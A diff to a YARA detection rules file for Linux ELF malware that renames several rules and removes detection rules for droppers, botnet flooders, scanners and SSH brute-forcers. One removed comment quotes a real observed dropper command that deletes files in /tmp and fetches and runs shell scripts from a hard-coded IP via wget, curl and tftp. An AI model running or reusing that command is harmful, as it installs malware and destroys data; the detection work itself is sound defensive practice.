@@ -8,7 +8,7 @@ include "rules/magics.yar"
 //     is_elf and elf.number_of_sections == 0
 // }
 
-rule SusELF_ShlCodeExe
+rule Shellcode_Executor
 {
   meta:
     author = "Nong Hoang Tu"
@@ -33,7 +33,7 @@ rule SusELF_ShlCodeExe
 //     elf_no_sections and filesize < 1KB
 // }
 
-rule SusELF_SegLoadRWE
+rule ELF_LoadRWE
 {
   meta:
     description = "Flags binaries with a single LOAD segment marked as RWE."
@@ -80,14 +80,14 @@ rule SusELF_SegLoadRWE
 //     )
 // }
 
-rule SusELF_FkDynSym {
+rule ELF_FakeDynSym {
   meta:
     description = "A fake dynamic symbol table has been added to the binary"
     family = "Obfuscation"
     filetype = "ELF"
     hash = "51676ae7e151a0b906c3a8ad34f474cb5b65eaa3bf40bb09b00c624747bcb241"
     reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L47"
-    target = "File, memory"
+    target = "File"
   condition:
     elf_exec and
     elf.entry_point < filesize and // file scanning only
@@ -151,7 +151,7 @@ rule SusELF_FkDynSym {
 //     elf_magic and elf.type != elf.ET_DYN and elf.sh_entry_size == 0
 // }
 
-rule SusELF_BackdoorImp {
+rule ImportFuncs_Backdoor {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -206,7 +206,7 @@ rule SusELF_BackdoorImp {
 }
 
 
-rule SusELF_PreloadRkitImp {
+rule ImportFuncs_PreLRootkit {
   meta:
     description = "Find DYN ELF bins that imports common function LD_PRELOAD rootkits hook"
   condition:
@@ -240,152 +240,12 @@ rule SusELF_PreloadRkitImp {
 }
 
 
-rule ShellExec_UserAdd {
-  meta:
-    description = "Bash commands to add new user to passwd"
-    author = "Nong Hoang Tu"
-    date = "12/11/2021"
-    target = "File, process's cmd, memory"
-  strings:
-    $1 = /echo[ "]+[\w\d_]+::0:0::\/:\/bin\/[\w"]+[ >]+\/etc\/passwd/
-  condition:
-    all of them
-}
-
-rule Dropper_Wget {
-  meta:
-    description = "Bash commands to download and execute binaries using wget"
-    reference = "https://www.trendmicro.com/en_us/research/19/d/bashlite-iot-malware-updated-with-mining-and-backdoor-commands-targets-wemo-devices.html"
-    author = "Nong Hoang Tu"
-    date = "12/11/2021"
-    target = "File, process's cmd, memory"
-  strings:
-    $re1 = /wget([ \S])+[; ]+chmod([ \S])+\+x([ \S])+[; ]+.\/(\S)+/
-  condition:
-    all of them
-}
-
-rule Dropper_Curl {
-  meta:
-    description = "Bash commands to download and execute binaries using CURL"
-    refrence = "https://otx.alienvault.com/indicator/file/2557ee8217d6bc7a69956e563e0ed926e11eb9f78e6c0816f6c4bf435cab2c81"
-    author = "Nong Hoang Tu"
-    date = "12/11/2021"
-    target = "File, process's cmd, memory"
-  strings:
-    $re1 = /curl([ \S])+\-O([ \S])+[; ]+cat([ >\.\S])+[; ]+chmod([ \S])+\+x([ \S\*])+[; ]+.\/([\S ])+/
-  condition:
-    all of them
-}
-
-rule Dropper_WgetCurl {
-  meta:
-    description = "Bash commands to download and execute binaries using CURL || Wget"
-    author = "Nong Hoang Tu"
-    date = "12/11/2021"
-    target = "File, process's cmd, memory"
-    hash = "16bbeec4e23c0dc04c2507ec0d257bf97cfdd025cd86f8faf912cea824b2a5ba"
-    hash = "b34bb82ef2a0f3d02b93ed069fee717bd1f9ed9832e2d51b0b2642cb0b4f3891"
-    // Tested target cd /tmp && rm -rf * && wget http://194.87.138.40/BootzIV.sh || curl -O http://194.87.138.40/BootzIV.sh && chmod 777 BootzIV.sh && ./BootzIV.sh && busybox tftp 194.87.138.40 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 194.87.138.40 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf BootzIV.sh tftp1.sh tftp2.sh
-  strings:
-    $re1 = /wget([ \S])+[; |]+curl([ \S]+)\-O([ \S])+[ |]+[&|; ]+chmod[&|; \d\w\.]+\//
-  condition:
-    all of them
-}
-
-rule Flooder_Gen1 {
-  meta:
-    author = "Nong Hoang Tu"
-    description = "Botnet.Linux.LizardSquad"
-    email = "dmknght@parrotsec.org"
-    date = "12/11/2021"
-    target = "File, memory"
-  strings:
-    $1 = "JUNK Flooding %s:%d" fullword ascii
-    $2 = "UDP Flooding %s" fullword ascii
-    $3 = "TCP Flooding %s" fullword ascii
-    $4 = "LOLNOGTFO" fullword ascii
-    $5 = "KILLATTK" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-rule Flooder_Gen2 {
-  meta:
-    author = "Nong Hoang Tu"
-    email = "dmknght@parrotsec.org"
-    date = "19/10/2022"
-  strings:
-    $1 = "[UDP] Failed to ddos" fullword ascii
-    $2 = "[HTTP] Flooding" fullword ascii
-    $3 = "[UDP] Flooding Rooted Spoof" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-rule Flooder_Gen3 {
-  meta:
-    author = "Nong Hoang Tu"
-    email = "dmknght@parrotsec.org"
-    date = "15/11/2021"
-    target = "File, Memory"
-    hash = "123e6d1138bfd58de1173818d82b504ef928d5a3be7756dd627c594de4aad096"
-  strings:
-    $1 = "Opening sockets" fullword ascii
-    $2 = "Sending attack" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-
-rule Flooder_Gen4 {
-  meta:
-    author = "Nong Hoang Tu"
-    email = "dmknght@parrotsec.org"
-    descriptions = "Some suspicious strings from Mirai's processes"
-  strings:
-    $ = "Flooding with" fullword ascii
-    $ = "HACKPGK" fullword ascii
-    $ = "RANDOMFLOOD" fullword ascii
-    $ = "SYNFLOOD" fullword ascii
-    $ = "ACKFLOOD" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-
-rule Netscan_Gen1 {
-  meta:
-    author = "Nong Hoang Tu"
-    email = "dmknght@parrotsec.org"
-    hash = "946689ba1b22d457be06d95731fcbcac"
-  strings:
-    $1 = "[i] Scanning:" fullword ascii
-    $2 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
-    $3 = "Portscan completed in" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-rule SshBrute_Gen1 {
-  meta:
-    author = "Nong Hoang Tu"
-    email = "dmknght@parrotsec.org"
-    hash = "946689ba1b22d457be06d95731fcbcac"
-  strings:
-    $1 = "FOUND: %s with port %s open" fullword ascii
-    $2 = "%s:%s %s port: %s --> %s" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
-
-
-rule Backdoor_Gen1 {
-  strings:
-    $ = "Starting backdoor daemon" fullword ascii
-  condition:
-    elf_magic and 2 of them
-}
+// rule Backdoor_Gen1 {
+//   strings:
+//     $ = "Starting backdoor daemon" fullword ascii
+//   condition:
+//     elf_magic and 2 of them
+// }
 // rule SusElf_PyCompiled {
 //   meta:
 //     author = "Nong Hoang Tu"
